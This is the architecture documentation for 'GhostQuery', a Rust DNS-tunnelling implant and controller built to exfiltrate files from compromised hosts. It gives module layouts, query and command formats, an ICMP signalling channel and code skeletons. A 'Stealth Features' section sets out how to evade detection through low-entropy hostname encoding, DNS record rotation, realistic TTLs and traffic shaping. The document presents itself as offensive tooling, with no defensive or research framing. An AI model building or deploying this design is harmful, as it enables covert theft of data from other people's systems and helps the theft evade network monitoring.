# GhostQuery Architecture Documentation

## System Overview

GhostQuery is a covert DNS exfiltration protocol inspired by ADSM (Asymmetric Distributed Shared Memory). It uses DNS queries as a communication channel to exfiltrate data from compromised hosts.

```
+-------------------+                              +-------------------+
|   IMPLANT         |    DNS Queries (Data)        |   CONTROLLER      |
|   (Edge Node)     |  ------------------------->  |   (Master Node)   |
|                   |                              |                   |
|   "Writer"        |  <-------------------------  |   "Reader"        |
|                   |    DNS Responses (Commands)  |                   |
+-------------------+                              +-------------------+
        |                                                   |
        | ICMP Side-Channel (Window Signals)                |
        +---------------------------------------------------+
```

## Core Concepts

### ADSM-Inspired Design

| ADSM Concept | GhostQuery Implementation |
|--------------|---------------------------|
| CPU (Writer) | Implant - pushes data via DNS |
| Accelerator (Reader) | Controller - receives passively |
| Shared Memory | DNS namespace (`[payload].[seq].[session].domain`) |
| Release Consistency | Data released only during authorized windows |
| Shadow Memory | Controller maintains copy of exfiltrated file |
| Page Faults | Gap detection triggers retransmission |

### Data Flow

```
1. INITIALIZATION
   Implant                          Controller
      |                                  |
      |-- ICMP SessionInit ------------->|
      |                                  |
      |-- DNS: init.<hash>.<session> --->|
      |<-- DNS: ACK (127.0.0.0) ---------|
      
2. DATA TRANSFER (per chunk)
      |                                  |
      |-- DNS: <encoded>.<seq>.<session>.|
      |<-- DNS: ACK or RETX -------------|
      
3. COMPLETION
      |                                  |
      |-- DNS: done.<session> ---------->|
      |<-- DNS: COMPLETE (127.0.0.5) ----|
```

## Module Architecture

```
ghost-query/
+-- lib.rs                    # Library root, re-exports
|
+-- common/                   # Shared types & utilities
|   +-- types.rs              # SessionId, ChunkId, Command, etc.
|   +-- constants.rs          # Protocol constants
|   +-- error.rs              # Error types
|
+-- encoding/                 # Data encoding (stealth)
|   +-- dictionary.rs         # Low-entropy word mapping
|   +-- base32.rs             # DNS-safe encoding
|   +-- entropy.rs            # Entropy analysis
|
+-- crypto/                   # Encryption
|   +-- cipher.rs             # AES-256-GCM
|   +-- hash.rs               # SHA-256 verification
|   +-- keys.rs               # Key derivation
|
+-- session/                  # Session management
|   +-- state.rs              # State machine
|   +-- buffer.rs             # Chunk buffering
|   +-- manager.rs            # Multi-session handling
|
+-- protocol/                 # Core protocol logic
|   +-- chunker.rs            # File chunking
|   +-- window.rs             # Sliding window
|   +-- coherence.rs          # Gap detection
|   +-- commands.rs           # Control encoding
|
+-- transport/                # Network layer
|   +-- dns/                  # DNS transport
|   |   +-- query.rs          # Query building
|   |   +-- response.rs       # Response parsing
|   |   +-- client.rs         # DNS client
|   |   +-- server.rs         # DNS server
|   +-- icmp/                 # Side-channel
|       +-- client.rs         # Signal sender
|       +-- server.rs         # Signal receiver
|
+-- implant/                  # Edge node
|   +-- client.rs             # Implant implementation
|
+-- controller/               # Master node
    +-- server.rs             # Controller implementation
    +-- shadow.rs             # Shadow memory
```

## Module Details

### 1. Common Module (`src/common/`)

#### `types.rs` - Core Data Types

```rust
// Session identifier (8 bytes)
pub struct SessionId([u8; 8]);

// Chunk sequence number
pub struct ChunkId(pub u32);

// Control commands (encoded in DNS responses)
pub enum Command {
    Ack = 0,          // Chunk received
    Retransmit = 1,   // Request resend
    Sleep = 2,        // Pause transmission
    Terminate = 3,    // End session
    Complete = 5,     // All done
}

// DNS record types for rotation
pub enum DnsRecordType { A, AAAA, CNAME, MX, TXT }

// File integrity hash (SHA-256)
pub struct FileHash([u8; 32]);
```

#### `constants.rs` - Protocol Constants

```rust
pub const DEFAULT_CHUNK_SIZE: usize = 32;      // Bytes per chunk
pub const DEFAULT_WINDOW_SIZE: usize = 8;       // Outstanding chunks
pub const MAX_LABEL_LENGTH: usize = 63;         // DNS label limit
pub const DEFAULT_TTL: u32 = 300;               // Realistic TTL
pub const COMMAND_IP_BASE: [u8; 3] = [127, 0, 0]; // 127.0.0.X
```

#### `error.rs` - Error Handling

```rust
pub enum GhostQueryError {
    SessionNotFound(String),
    ChunkOutOfOrder { expected: u32, actual: u32 },
    HashMismatch,
    Timeout,
    EncryptionError(String),
    // ... etc
}
```

### 2. Encoding Module (`src/encoding/`)

**Purpose**: Make DNS queries look legitimate by reducing entropy.

#### `dictionary.rs` - Word Mapping

Maps binary data to realistic hostname components:

```
Binary Data    ->    Hostname Label
0xAB, 0xCD     ->    "cdn-img-02"
0x89, PNG      ->    "img-png"
```

Prefixes: `cdn`, `api`, `img`, `static`, `assets`, `cache`, `edge`, ...
Suffixes: `01`, `02`, `v1`, `v2`, `us`, `eu`, `east`, `west`, ...

#### `base32.rs` - DNS-Safe Encoding

RFC 4648 Base32 (A-Z, 2-7) for arbitrary binary data:

```rust
// Encode: binary -> dns-safe string
fn encode(&self, data: &[u8]) -> String;

// Decode: dns-safe string -> binary
fn decode(&self, encoded: &str) -> Vec<u8>;
```

#### `entropy.rs` - Entropy Analysis

Shannon entropy calculation to detect suspicious hostnames:

```rust
// Legitimate: "cdn-img-02" -> entropy ~2.5 (low)
// Suspicious: "x8za9b7c6d" -> entropy ~3.8 (high)
pub const ENTROPY_THRESHOLD: f64 = 3.5;
```

### 3. Crypto Module (`src/crypto/`)

**Purpose**: End-to-end encryption of exfiltrated data.

#### `cipher.rs` - AES-256-GCM

```rust
pub struct AesGcmCipher {
    cipher: Aes256Gcm,
}

impl AesGcmCipher {
    // Encrypt with session context (AAD)
    fn encrypt_with_aad(&self, plaintext: &[u8], aad: &[u8]) -> Vec<u8>;
    
    // Decrypt with verification
    fn decrypt_with_aad(&self, ciphertext: &[u8], aad: &[u8]) -> Vec<u8>;
}
```

Output format: `[nonce (12 bytes)][ciphertext][tag (16 bytes)]`

#### `hash.rs` - SHA-256 Hashing

```rust
pub struct Hasher { hasher: Sha256 }

// File integrity verification
pub fn verify_hash(data: &[u8], expected: &FileHash) -> bool;
```

#### `keys.rs` - Key Management

```rust
pub struct KeyManager {
    master_key: [u8; 32],
}

impl KeyManager {
    // Derive session-specific key
    fn derive_session_key(&self, session_id: &[u8; 8]) -> [u8; 32];
}
```

Key derivation: `SHA256(master_key || session_id || "GhostQuery-SessionKey-v1")`

### 4. Session Module (`src/session/`)

**Purpose**: Track exfiltration state and manage data buffers.

#### `state.rs` - State Machine

```
States (ADSM-inspired):
  Invalid -> Allocated -> Active -> Verifying -> Complete
                            |
                            v
                          Dirty (needs retransmit)
                            |
                            v
                         Terminated
```

```rust
pub struct SessionStateMachine {
    state: SessionState,
    metadata: Option<SessionMetadata>,
    last_sent: Option<ChunkId>,
    last_acked: Option<ChunkId>,
    dirty_chunks: Vec<ChunkId>,
}
```

#### `buffer.rs` - Chunk Buffer

```rust
pub struct ChunkBuffer {
    chunks: BTreeMap<ChunkId, BufferEntry>,
    pending_queue: VecDeque<ChunkId>,
    in_flight: Vec<ChunkId>,
    window_size: usize,
    window_open: bool,
}

// Chunk states: Pending -> InFlight -> Acknowledged
//                           |-> Dirty (needs resend)
```

#### `manager.rs` - Multi-Session

```rust
pub struct SessionManager {
    sessions: HashMap<SessionId, Session>,
    master_keys: KeyManager,
    timeout: Duration,
    max_sessions: usize,
}
```

### 5. Protocol Module (`src/protocol/`)

**Purpose**: Core protocol mechanisms.

#### `chunker.rs` - File Chunking

```rust
pub struct FileChunker {
    chunk_size: usize,
    cipher: Option<AesGcmCipher>,
}

// Split file into chunks
fn chunk_file<R: Read>(&self, reader: &mut R) -> ChunkedFile;

// Reassemble chunks into file
pub struct ChunkReassembler {
    chunks: Vec<Option<Vec<u8>>>,
    expected_hash: FileHash,
}
```

#### `window.rs` - Sliding Window

```rust
pub struct WindowController {
    size: usize,           // Max outstanding
    slots: VecDeque<WindowSlot>,
    base: ChunkId,         // First unacked
    next: ChunkId,         // Next to send
    dirty_count: usize,
    is_open: bool,
}

// Flow control: Only send when window allows
fn can_send(&self) -> bool {
    self.is_open && 
    self.slots.len() < self.size && 
    self.dirty_count < self.rolling_size
}
```

#### `coherence.rs` - Gap Detection

```rust
pub struct CoherenceProtocol {
    states: BTreeMap<ChunkId, ChunkState>,
    expected_seq: ChunkId,
    dirty_set: BTreeSet<ChunkId>,
}

// Detect missing chunks
fn receive_chunk(&mut self, id: ChunkId) -> CoherenceAction {
    if id > self.expected_seq {
        // Gap detected!
        CoherenceAction::RequestRetransmit(missing)
    } else {
        CoherenceAction::Ack
    }
}
```

#### `commands.rs` - Command Encoding

Commands encoded in A record IP addresses:

```
127.0.0.0 = ACK (success)
127.0.0.1 = RETRANSMIT
127.0.0.2 = SLEEP
127.0.0.3 = TERMINATE
127.0.0.5 = COMPLETE

Retransmit with chunk ID:
127.[high_byte].[low_byte].1
Example: 127.0.42.1 = Retransmit chunk 42
```

### 6. Transport Module (`src/transport/`)

**Purpose**: Network communication.

#### DNS Transport (`dns/`)

**Query Building (`query.rs`):**

```
Format: [payload].[seq].[session].<domain>

Example: cdn-ab-01.seq-00002a.0102030405060708.ghost.local
         ^^^^^^^^^  ^^^^^^^^^  ^^^^^^^^^^^^^^^^  ^^^^^^^^^^
         Encoded    Sequence   Session ID        Domain
         Data       (hex)      (hex)
```

**Response Parsing (`response.rs`):**

```rust
pub struct DnsResponse {
    record_type: DnsRecordType,
    ttl: u32,
    control: ControlResponse,  // Decoded command
}

// Parse A record -> command
fn from_a_record(ip: Ipv4Addr, ttl: u32) -> DnsResponse;
```

**Client (`client.rs`):**

```rust
pub struct DnsClient {
    resolver: TokioAsyncResolver,
    timeout: Duration,
}

// Send query, get response
async fn send(&self, query: &DnsQuery) -> Result<DnsResponse>;
```

**Server (`server.rs`):**

```rust
pub trait QueryHandler {
    async fn handle_query(&self, query: &ParsedQuery) -> DnsResponse;
}

pub struct DnsServer {
    config: DnsServerConfig,
    running: Arc<RwLock<bool>>,
}
```

#### ICMP Transport (`icmp/`)

Side-channel for window synchronization:

```rust
pub enum IcmpSignal {
    WindowOpen,   // 0x1001 - Start transmission
    WindowClose,  // 0x1002 - Stop transmission
    SessionInit,  // 0x2001 - Begin session
    SessionEnd,   // 0x2002 - End session
}

// Packet format: [MAGIC "GQP!"][SIGNAL][SESSION_ID][DATA]
```

### 7. Implant Module (`src/implant/`)

**Purpose**: Client-side exfiltration logic.

```rust
pub struct ImplantClient {
    config: ImplantConfig,
    state: ImplantState,      // Idle/Transmitting/Sleeping/Done
    session: SessionStateMachine,
    buffer: ChunkBuffer,
    window: WindowController,
    keys: KeyManager,
    encoder: GhostEncoder,
}

// Main workflow
async fn exfiltrate_file(&self, path: &Path) -> Result<()> {
    // 1. Generate session ID
    // 2. Create cipher for session
    // 3. Chunk and encrypt file
    // 4. Initialize session on controller
    // 5. Transmit chunks (with retransmission)
    // 6. Complete session
}
```

### 8. Controller Module (`src/controller/`)

**Purpose**: Server-side reception and reconstruction.

#### `server.rs` - Main Server

```rust
pub struct ControllerServer {
    config: ControllerConfig,
    shadow: Arc<ShadowMemory>,
    keys: KeyManager,
    running: Arc<RwLock<bool>>,
}

// Handle incoming DNS queries
fn handle_chunk(&self, session_id, sequence, payload) -> DnsResponse {
    match self.shadow.receive_chunk(...) {
        ChunkReceiveResult::Ack => DnsResponse::ack(),
        ChunkReceiveResult::Retransmit(ids) => DnsResponse::retransmit(ids[0]),
        ChunkReceiveResult::Complete => DnsResponse::complete(),
    }
}
```

#### `shadow.rs` - Shadow Memory

```rust
pub struct ShadowMemory {
    sessions: HashMap<SessionId, SessionShadow>,
    key_manager: KeyManager,
}

pub struct SessionShadow {
    coherence: CoherenceProtocol,  // Track chunks
    reassembler: ChunkReassembler, // Rebuild file
    cipher: AesGcmCipher,          // Decrypt chunks
}

// Receive and decode chunk
fn receive_encoded_chunk(&mut self, seq: u32, payload: &str) -> ChunkReceiveResult;

// Reassemble complete file
fn reassemble(&self) -> Result<Vec<u8>>;
```

## Dependencies

| Crate | Purpose |
|-------|---------|
| `tokio` | Async runtime |
| `trust-dns-*` | DNS client/server |
| `aes-gcm` | AES-256-GCM encryption |
| `sha2` | SHA-256 hashing |
| `base32` | Base32 encoding |
| `rand` | Random number generation |
| `serde` | Serialization |
| `clap` | CLI parsing |
| `tracing` | Logging |
| `socket2` | Raw ICMP sockets |
| `pnet` | Network packet handling |

## Stealth Features

1. **Low-Entropy Encoding**: Dictionary maps binary to realistic words
2. **Record Rotation**: Cycles through A, AAAA, CNAME, MX, TXT
3. **Realistic TTLs**: Uses 60-3600 second TTLs with randomization
4. **Traffic Shaping**: Configurable delays between queries
5. **Encryption**: All data encrypted before encoding

## Security Considerations

- Master key must be securely shared between implant and controller
- DNS queries are visible to network monitors (but encrypted/encoded)
- ICMP side-channel requires elevated privileges
- Session IDs should be random and unpredictable

